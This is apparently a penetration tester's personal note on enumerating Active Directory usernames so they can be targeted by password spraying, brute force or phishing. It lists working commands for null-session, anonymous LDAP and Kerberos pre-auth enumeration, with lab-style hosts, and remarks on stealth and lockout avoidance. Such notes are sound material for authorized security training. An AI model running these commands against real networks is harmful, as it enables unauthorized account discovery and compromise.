-- -
Generate a list of valid domain usernames for you to attack via a #passwordspray attack, bruteforce attack or phishing attack. 
### Tactics
- Leverage #SMBNull session to retrieve a complete list of domain users from the domain controller.
- Leverage LDAP anonymous bind to pull down list of valid domain users
- Leverage [[Dark Arts/Tools/Kerbrute|Kerbrute]] to validate users using a wordlist from the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) repo or gathered by a tool such as [linkedin2username](https://github.com/initstring/linkedin2username) to create a list of potentially valid users. 
- Use sets of credentials provided by the client or obtained through other means such as [[LLMNR Poisoning]] or a successful password spray using a smaller wordlist. 
### Leverage Anon Access
Automated tools that leverage #SMBNull sessions or LDAP anonymous binds.
##### enum4linux
```bash
enum4linux -U <ip> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

^3ddb4d

##### rpcclient
```bash
# connect to server
rpcclient -U "" -N <ip>

# on server over rpc
enumdomusers
```

^3479a7

##### Netexec
Will return valid users with the amount of invalid login attempts on that user as well as the last time there was an incorrect login attempt. Helps us determine how close an account is to lock out. If the environment uses multiple DCs, then the bad login data points would be tracked separately on each DC, so we would need to query each DC and add up the amount of bad login attempts there have been for that account. 
```bash
netexec smb <ip> --users
```

^38aeea

##### ldapsearch
Get valid domain users from LDAP anonymous bind
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

^327bd7

##### windapsearch
Get valid domain users from anonymous bind
```bash
./windapsearch.py --dc-ip <dc ip> -u "" -U
```

^bb80aa

##### Kerbrute
Uses kerberos pre-auth to determine if a username is valid. Potentially more stealthy approach and does not lock out accounts.
```bash
kerbrute userenum -d <domain> --dc <dc ip> <wordlist>
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```